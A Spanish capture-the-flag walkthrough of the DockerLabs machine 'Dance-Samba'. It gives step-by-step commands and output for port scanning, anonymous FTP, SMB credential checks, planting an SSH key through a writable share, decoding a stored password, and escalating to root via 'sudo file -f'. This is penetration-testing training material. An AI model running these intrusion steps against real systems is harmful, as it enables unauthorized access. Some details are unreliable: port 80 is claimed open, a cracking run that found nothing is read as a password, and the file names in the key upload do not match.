#MAQUINA #DOCKERLABS #MEDIO
#FTP_ANON
#CRACKMAPEXEC  #SMBMAP #SMBCLIENT
<hr>

# RECONOCIMIENTO

Vamos a resolver **Dance-Samba** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-04 15:29 CET
Initiating ARP Ping Scan at 15:29
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 15:29, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 15:29
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 21/tcp on 172.17.0.2
Discovered open port 445/tcp on 172.17.0.2
Discovered open port 139/tcp on 172.17.0.2
Completed SYN Stealth Scan at 15:29, 0.48s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2025-02-04 15:29:36 CET for 0s
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE      REASON
21/tcp  open  ftp          syn-ack ttl 64
22/tcp  open  ssh          syn-ack ttl 64
139/tcp open  netbios-ssn  syn-ack ttl 64
445/tcp open  microsoft-ds syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.69 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)

```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)**, **puerto 139** , **puerto 445(SMB)** y el puerto **22(SSH)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p21,22,139,445 172.17.0.2                    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-04 15:30 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.000018s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              69 Aug 19 18:03 nota.txt
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a2:4e:66:7d:e5:2e:cf:df:54:39:b2:08:a9:97:79:21 (ECDSA)
|_  256 92:bf:d3:b8:20:ac:76:08:5b:93:d7:69:ef:e7:59:e1 (ED25519)
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-02-04T14:30:55
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.68 seconds


```


- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

**Conclusiones:** Podemos sacar:
+ El puerto **21 (FTP)** es vulnerable a **ftp-anon** -> entrar con usuario anonymous sin necesidad de poner contraseña.

## FTP (21)

Al entrar con usuario anonymous, vemos una nota.txt:

```shell
cat nota.txt 

I don't know what to do with Macarena, she's obsessed with donald.

```

Posible usuario **macarena** y **donald** tiene pinta de ser su contra.
## SMB (445)

Comprobamos con **crackmapexec** si las credenciales son correctas:

```shell

crackmapexec smb 172.17.0.2 -u macarena -p donald 
SMB         172.17.0.2      445    4E3F25C9A36E     [*] Windows 6.1 Build 0 (name:4E3F25C9A36E) (domain:4E3F25C9A36E) (signing:False) (SMBv1:False)
SMB         172.17.0.2      445    4E3F25C9A36E     [+] 4E3F25C9A36E\macarena:donald 

```

Efectivamente.

Vemos con **smbmap** la estructura y a que tenemos acceso:

```shell

smbmap -H 172.17.0.2 -u macarena -p donald     

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 172.17.0.2:445  Name: pressenter.hl             Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  READ ONLY       Printer Drivers
        macarena                                                READ, WRITE
        IPC$                                                    NO ACCESS       IPC Service (4e3f25c9a36e server (Samba, Ubuntu))
[*] Closed 1 connections

```

Vemos que nos interesa el directorio de macarena y accedemos con **smbclient**.

```shell

smbclient //172.17.0.2/macarena -U macarena     
Password for [WORKGROUP\macarena]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Feb  4 15:49:24 2025
  ..                                  D        0  Tue Feb  4 15:49:24 2025
  .bashrc                             H     3771  Mon Aug 19 18:18:51 2024
  .cache                             DH        0  Mon Aug 19 18:40:39 2024
  .bash_history                       H        5  Mon Aug 19 19:26:02 2024
  .bash_logout                        H      220  Mon Aug 19 18:18:51 2024
  user.txt                            N       33  Mon Aug 19 18:20:25 2024
  .profile                            H      807  Mon Aug 19 18:18:51 2024

                229727556 blocks of size 1024. 190381376 blocks available
smb: \> get user.txt 
getting file \user.txt of size 33 as user.txt (330000.0 KiloBytes/sec) (average inf KiloBytes/sec)
smb: \> 

```

Vemos un archivo **user.txt** :

```

john --format=Raw-Md5 --wordlist=/usr/share/wordlists/rockyou.txt user.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=12
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2025-02-04 16:05) 0g/s 38765Kp/s 38765Kc/s 38765KC/s  fuckyooh21..*7¡Vamos!
Session completed. 

```

Posible contra -> `fuckyooh21..*7¡Vamos!`

No funciona como contra de ssh, pero tenemos **permisos de escritura en el directorio de macarena**.
# EXPLOTACION

Creamos un par de claves con **ssh-keygen**:

```shell

ssh-keygen -t rsa -b 4096 

```

Eliminar el salto de línea en la clave pública:

```shell

cat ./id_rsa.pub | tr -d '\n' 

```

Ahora lo metemos en el directorio de macarena en un **/.ssh/authorized_keys**:

```shell

smbclient //172.17.0.2/macarena -U macarena
mkdir .ssh
cd .ssh
put id_rsa.pub
rename id_rsa authorized_keys

```

Y ahora accedemos mediante **ssh**:
```shell

ssh macarena@172.17.0.2 -i id_rsa

```

YA ESTAMOS COMO MACARENA.
# ESCALADA PRIVILEGIOS

Vemos que hay un **hash** en un directorio **secret**:

   ```bash
macarena@4e3f25c9a36e:/home$ cd secret/
macarena@4e3f25c9a36e:/home/secret$ ls
hash
macarena@4e3f25c9a36e:/home/secret$ cat hash
MMZVM522LBFHUWSXJYYWG3KWO5MVQTT2MQZDS6K2IE6T2===
macarena@4e3f25c9a36e:/home/secret$ cat hash | base64 -d
0�U3��,GQd�%��;�A4�1CK�� N�base64: invalid input
macarena@4e3f25c9a36e:/home/secret$ echo "MMZVM522LBFHUWSXJYYWG3KWO5MVQTT2MQZDS6K2IE6T2===" | base32 --decode
c3VwZXJzZWN1cmVwYXNzd29yZA==macarena@4e3f25c9a36e:/home/secret$ echo "c3VwZXJzZWN1cmVwYXNzd29yZA==" | base64 -d
supersecurepasswordmacarena@4e3f25c9a36e:/home/secret$ 


```

**Contra -> supersecurepassword**

ES LA CONTRA DE MACARENA y la usaremos para ver los archivos con permisos SUDO.

```bash

macarena@4e3f25c9a36e:/home/secret$ sudo -l
[sudo] password for macarena: 
Matching Defaults entries for macarena on 4e3f25c9a36e:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User macarena may run the following commands on 4e3f25c9a36e:
    (ALL : ALL) /usr/bin/file

```

Vemos **file** con permisos SUDO y hay un archivo **password.txt** en **opt** :
   ```bash
macarena@4e3f25c9a36e:/$ sudo file -f /opt/password.txt 
root:rooteable2: cannot open `root:rooteable2' (No such file or directory)

```

**YA ESTAMOS COMO ROOT.**